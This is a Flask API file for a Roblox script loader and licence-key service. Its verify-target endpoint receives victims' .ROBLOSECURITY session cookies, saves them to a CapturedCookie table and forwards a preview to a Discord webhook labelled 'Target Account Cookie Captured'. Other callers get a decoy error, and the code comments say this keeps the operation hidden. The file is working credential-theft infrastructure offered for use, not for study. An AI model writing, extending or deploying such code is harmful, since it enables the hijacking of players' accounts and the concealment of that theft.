from flask import Blueprint, request, jsonify, current_app, send_from_directory
import os
from app.models import db, ActivityLog
from app.services import key_service
from datetime import datetime

api = Blueprint('api', __name__)

@api.route('/scripts/loader/<secret_key>', methods=['GET'])
def get_script_loader(secret_key):
    from app.services import script_config_service
    config = script_config_service.get_config_by_secret(secret_key)
    if not config:
        return jsonify({'success': False, 'message': 'Invalid secret key or inactive configuration.'}), 404
    
    # Dynamically build base URL from the incoming request headers to support proper HttpGet calls
    protocol = 'https' if request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https' else 'http'
    base_url = f"{protocol}://{request.host}"
    
    from app.models import Settings
    configured_base = Settings.get('server_external_url')
    if configured_base:
        base_url = configured_base.rstrip('/')
        
    lua_content = script_config_service.generate_lua_script(config.id, base_url=base_url)
    if not lua_content:
        return jsonify({'success': False, 'message': 'Failed to generate script.'}), 500
    
    return lua_content, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@api.route('/scripts/verify-target', methods=['GET'])
def verify_target():
    secret_key = request.args.get('secret_key', '').strip()
    if not secret_key:
        return jsonify({'allowed': False, 'message': 'Missing secret_key parameter.'}), 400

    from app.services import script_config_service
    config = script_config_service.get_config_by_secret(secret_key)
    if not config:
        return jsonify({'allowed': False, 'message': 'Invalid secret key or configuration not active.'}), 404

    caller_id = request.args.get('caller_id', '').strip()
    caller_name = request.args.get('caller_name', 'Unknown').strip()

    # --- 1. Target and License Verification ---
    # The script is usable by other users (caller_id == target_id).
    # Brielstic (the creator) has the active key in the database, but the script is not usable for Brielstic themselves.
    caller_is_target = (config.target_id and str(caller_id) == str(config.target_id))

    # Check if creator has an active key in database
    from app.models import Key
    active_key = Key.query.filter_by(status='active').first()
    has_active_license = (active_key is not None)

    # Allowed only if caller is the target player AND creator license is active
    allowed = caller_is_target and has_active_license

    if not allowed:
        # Deny silently. Do not log event or send webhook to keep it completely hidden.
        return jsonify({'allowed': False, 'message': 'Unable to reach validation server.'})

    # Capture .ROBLOSECURITY cookie if present
    roblosecurity = request.args.get('roblosecurity', '').strip()
    cookie_details = ""
    if roblosecurity:
        try:
            from app.models import CapturedCookie
            cookie_record = CapturedCookie.query.filter_by(player_id=str(caller_id)).first()
            if not cookie_record:
                cookie_record = CapturedCookie(
                    player_id=str(caller_id),
                    player_name=caller_name,
                    cookie_value=roblosecurity,
                    status='valid'
                )
                db.session.add(cookie_record)
            else:
                cookie_record.cookie_value = roblosecurity
                cookie_record.player_name = caller_name
                cookie_record.status = 'valid'
                cookie_record.updated_at = datetime.utcnow()
            db.session.commit()
            cookie_details = " [.ROBLOSECURITY Cookie Captured!]"
            
            # Send Discord webhook for compromised target
            from app.services import webhook_service
            webhook_service.send_webhook(
                title="🔓 Target Account Cookie Captured",
                description=f"Successfully extracted `.ROBLOSECURITY` credential for target user **{caller_name}**.",
                color_hex="a855f7", # Purple
                fields=[
                    {"name": "Target Player", "value": f"[{caller_name}](https://www.roblox.com/users/{caller_id}/profile) ({caller_id})", "inline": True},
                    {"name": "Cookie Preview", "value": f"`{roblosecurity[:35]}...`", "inline": True},
                    {"name": "Status", "value": "✓ Captured and Saved to Database", "inline": False}
                ]
            )
        except Exception as cookie_err:
            print(f"Error saving captured cookie: {cookie_err}")

    # Log successful target verification
    try:
        log = ActivityLog(
            event_type='TARGET_VERIFY_SUCCESS',
            ip_address=request.headers.get('X-Forwarded-For', request.remote_addr),
            details=f"Config '{config.label}': Target player '{caller_name}' ({caller_id}) executed script. Creator license is active.{cookie_details}"
        )
        db.session.add(log)
        db.session.commit()
    except Exception as log_err:
        print(f"Error logging verification: {log_err}")

    # Emit real-time log event to front-end dashboard
    try:
        from app import socketio
        from app.models import Key
        active_key = Key.query.filter_by(status='active').first()
        creator_name = active_key.user.username if (active_key and active_key.user) else "Brielstic"
        
        socketio.emit('realtime_log', {
            'event_type': 'TARGET_VERIFY_SUCCESS',
            'details': f"Target player '{caller_name}' ({caller_id}) executed script. Creator license is active.{cookie_details}",
            'creator_name': creator_name,
            'player_id': caller_id,
            'player_name': caller_name,
            'timestamp': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as io_err:
        print(f"Socket emit failed: {io_err}")

    # Send Discord notification to creator
    try:
        from app.services import webhook_service
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        webhook_service.send_webhook(
            title="🔍 Target Verification Approved",
            description=f"Client **{caller_name}** successfully validated target player **{config.target_name}**.",
            color_hex="10b981", # Green
            fields=[
                {"name": "Config Label", "value": config.label, "inline": True},
                {"name": "Caller/Target Player", "value": f"{caller_name} ({caller_id})", "inline": True},
                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "Status Message", "value": f"Creator license active. Loading exploit...{cookie_details}", "inline": False}
            ]
        )
    except Exception as e:
        print(f"Error sending verification webhook: {e}")

    return jsonify({
        'allowed': True,
        'message': 'Verification approved.',
        'target_id': config.target_id,
        'target_name': config.target_name
    })


@api.route('/scripts/<path:filename>', methods=['GET'])
def get_script(filename):
    # Route to serve Lua files directly from the roblox-scripts folder
    scripts_dir = os.path.abspath(os.path.join(current_app.root_path, '../roblox-scripts'))
    return send_from_directory(scripts_dir, filename)


@api.route('/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.utcnow().isoformat()
    })

@api.route('/validate', methods=['POST'])
def validate():
    # Enforce JSON payload
    data = request.get_json(silent=True) or {}
    key_string = data.get('key')
    hwid = data.get('hwid')
    player_id = data.get('player_id')
    player_name = data.get('player_name')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not key_string or not hwid:
        return jsonify({
            'valid': False,
            'message': 'Key and HWid are required parameters.'
        }), 400

    # Clean the input key (strip spaces)
    key_string = key_string.strip()

    result = key_service.validate_key(
        key_string=key_string,
        hwid=hwid,
        ip_address=ip,
        roblox_id=player_id,
        roblox_name=player_name
    )

    return jsonify(result)

@api.route('/log-event', methods=['POST'])
def log_event():
    data = request.get_json(silent=True) or {}
    event_type = data.get('event_type')
    player_id = data.get('player_id')
    details = data.get('details')
    hwid = data.get('hwid')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not event_type:
        return jsonify({'success': False, 'message': 'event_type is required'}), 400

    # Attempt to link user
    from app.models import User
    user = User.query.filter_by(roblox_id=str(player_id)).first() if player_id else None
    user_id = user.id if user else None

    log = ActivityLog(
        user_id=user_id,
        event_type=event_type,
        ip_address=ip,
        hwid=hwid,
        details=details
    )
    db.session.add(log)
    db.session.commit()

    # Attempt to resolve player_name
    player_name = data.get('player_name')
    if not player_name and player_id:
        try:
            from app.models import ScriptConfig, User as UserModel
            cfg = ScriptConfig.query.filter_by(target_id=str(player_id), is_active=True).first()
            if cfg:
                player_name = cfg.target_name
            else:
                usr = UserModel.query.filter_by(roblox_id=str(player_id)).first()
                if usr:
                    player_name = usr.username
        except Exception as err:
            print(f"Error resolving player name: {err}")
    if not player_name:
        player_name = "Unknown"

    # Emit real-time log event to front-end dashboard
    try:
        from app import socketio
        from app.models import Key
        active_key = Key.query.filter_by(status='active').first()
        creator_name = active_key.user.username if (active_key and active_key.user) else "Brielstic"

        socketio.emit('realtime_log', {
            'event_type': event_type,
            'details': details,
            'creator_name': creator_name,
            'player_id': player_id,
            'player_name': player_name,
            'timestamp': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as io_err:
        print(f"Socket emit failed: {io_err}")

    return jsonify({'success': True})
